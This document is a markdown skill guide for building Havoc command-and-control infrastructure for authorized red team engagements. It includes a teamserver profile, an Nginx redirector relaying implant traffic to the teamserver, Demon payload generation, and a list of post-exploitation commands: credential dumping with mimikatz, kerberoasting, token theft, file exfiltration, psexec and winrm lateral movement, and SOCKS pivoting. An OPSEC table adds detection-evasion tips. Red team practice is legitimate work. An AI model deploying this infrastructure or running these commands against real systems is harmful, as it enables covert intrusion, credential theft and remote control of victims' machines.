---
name: building-red-team-c2-infrastructure-with-havoc
description: Deploy and configure the Havoc C2 framework with teamserver, HTTPS listeners, redirectors, and Demon agents for authorized red team operations.
domain: cybersecurity
subdomain: red-teaming
tags: [havoc-c2, command-and-control, red-team-infrastructure, post-exploitation, adversary-emulation, demon-agent]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Building Red Team C2 Infrastructure with Havoc

## Overview

Havoc is a modern, open-source post-exploitation command and control (C2) framework created by C5pider. It provides a collaborative multi-operator interface similar to Cobalt Strike, featuring the Demon agent for Windows post-exploitation, customizable profiles for traffic malleable configurations, and support for HTTP/HTTPS/SMB listeners. This skill covers deploying production-grade Havoc C2 infrastructure with proper OPSEC considerations for authorized red team engagements.

## Prerequisites

- Ubuntu 22.04 LTS or Debian 11+ (for Teamserver)
- Kali Linux 2023+ (for Client)
- VPS providers: DigitalOcean, Linode, or AWS EC2 (minimum 2GB RAM, 2 vCPU)
- Domain name aged 30+ days with valid SSL certificate
- Written authorization for red team engagement

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                    HAVOC C2 ARCHITECTURE                      │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────┐     ┌──────────────┐     ┌──────────────────┐ │
│  │  Havoc    │────▶│  HTTPS       │────▶│  Target Network  │ │
│  │  Client   │     │  Redirector  │     │  (Demon Agent)   │ │
│  │  (Kali)   │     │  (Nginx/CDN) │     │                  │ │
│  └──────────┘     └──────────────┘     └──────────────────┘ │
│       │                   │                                   │
│       │           ┌──────────────┐                            │
│       └──────────▶│  Havoc       │                            │
│                   │  Teamserver  │                            │
│                   │  (Ubuntu VPS)│                            │
│                   │  Port 40056  │                            │
│                   └──────────────┘                            │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

## Step 1: Install Havoc Teamserver

```bash
# Clone the Havoc repository
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Install dependencies (Ubuntu 22.04)
sudo apt update
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 \
    libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
    libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
    libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser \
    qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
    qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev \
    python3-dev libboost-all-dev mingw-w64 nasm

# Build the Teamserver
cd teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
cd ..
make ts-build

# Build the Client
make client-build
```

## Step 2: Configure Teamserver Profile

Create the Havoc profile (`havoc.yaotl`):

```hcl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator1" {
        Password = "Str0ngP@ssw0rd!"
    }
    user "operator2" {
        Password = "An0th3rP@ss!"
    }
}

Listeners {
    Http {
        Name         = "HTTPS Listener"
        Hosts        = ["c2.yourdomain.com"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 443
        PortConn     = 443
        Secure       = true
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

        Uris = [
            "/api/v2/auth",
            "/api/v2/status",
            "/content/images/gallery",
        ]

        Headers = [
            "X-Requested-With: XMLHttpRequest",
            "Content-Type: application/json",
        ]

        Response {
            Headers = [
                "Content-Type: application/json",
                "Server: nginx/1.24.0",
                "X-Frame-Options: DENY",
            ]
        }
    }
}

Demon {
    Sleep  = 10
    Jitter = 30

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

## Step 3: Start Teamserver

```bash
# Start the Havoc Teamserver with the profile
./havoc server --profile ./profiles/havoc.yaotl -v

# Expected output:
# [*] Havoc Framework [Version: 0.7]
# [*] Teamserver started on: 0.0.0.0:40056
# [*] HTTPS Listener started on: 0.0.0.0:443
```

## Step 4: Configure HTTPS Redirector

Set up an Nginx reverse proxy on a separate VPS as a redirector:

```nginx
# /etc/nginx/sites-available/c2-redirector
server {
    listen 443 ssl;
    server_name c2.yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem;

    # Only forward traffic matching C2 URIs
    location /api/v2/auth {
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    location /api/v2/status {
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
    }

    location /content/images/gallery {
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
    }

    # Redirect all other traffic to legitimate site
    location / {
        return 301 https://www.microsoft.com;
    }
}
```

## Step 5: Generate Demon Payload

```bash
# Via the Havoc Client GUI:
# Attack > Payload
# Agent: Demon
# Listener: HTTPS Listener
# Arch: x64
# Format: Windows Exe / Windows Shellcode
# Sleep Technique: WaitForSingleObjectEx (Ekko)
# Spawn: C:\Windows\System32\notepad.exe

# The generated Demon payload connects back through:
# Target -> Redirector (Nginx) -> Teamserver
```

## Step 6: Post-Exploitation with Demon

Once a Demon session checks in, common post-exploitation commands:

```
# Session interaction
demon> whoami
demon> shell systeminfo
demon> shell ipconfig /all

# Process listing
demon> proc list

# File operations
demon> download C:\Users\target\Documents\sensitive.docx
demon> upload /tools/Rubeus.exe C:\Windows\Temp\r.exe

# In-memory .NET execution (no disk touch)
demon> dotnet inline-execute /tools/Seatbelt.exe -group=all
demon> dotnet inline-execute /tools/SharpHound.exe -c All

# Token manipulation
demon> token steal <PID>
demon> token make DOMAIN\user password

# Credential access
demon> mimikatz sekurlsa::logonpasswords
demon> dotnet inline-execute /tools/Rubeus.exe kerberoast

# Lateral movement
demon> jump psexec TARGET_HOST HTTPS_LISTENER
demon> jump winrm TARGET_HOST HTTPS_LISTENER

# Pivoting
demon> socks start 1080
demon> rportfwd start 8080 TARGET_INTERNAL 80
```

## OPSEC Considerations

| Aspect | Recommendation |
|---|---|
| Domain Age | Register domains 30+ days before engagement |
| SSL Certificates | Use Let's Encrypt or purchased certificates, never self-signed |
| Categorization | Submit domain to Bluecoat/Fortiguard for categorization |
| Sleep/Jitter | Minimum 10s sleep with 30%+ jitter for long-haul operations |
| User-Agent | Match target organization's common browser user-agent |
| Kill Date | Set payload expiration to engagement end date |
| Infrastructure | Separate teamserver, redirector, and phishing infrastructure |
| Payload Format | Use shellcode with custom loader instead of raw EXE |

## MITRE ATT&CK Mapping

| Technique ID | Name | Phase |
|---|---|---|
| T1583.001 | Acquire Infrastructure: Domains | Resource Development |
| T1583.003 | Acquire Infrastructure: Virtual Private Server | Resource Development |
| T1587.001 | Develop Capabilities: Malware | Resource Development |
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | Command and Control |
| T1090.002 | Proxy: External Proxy | Command and Control |
| T1105 | Ingress Tool Transfer | Command and Control |
| T1055 | Process Injection | Defense Evasion |

## References

- Havoc Framework GitHub: https://github.com/HavocFramework/Havoc
- Havoc Wiki: https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD
- RedTeamOps Havoc 101: https://github.com/WesleyWong420/RedTeamOps-Havoc-101
- Deploying Havoc C2 via Terraform: https://www.100daysofredteam.com/p/red-team-infrastructure-deploying-havoc-c2-via-terraform
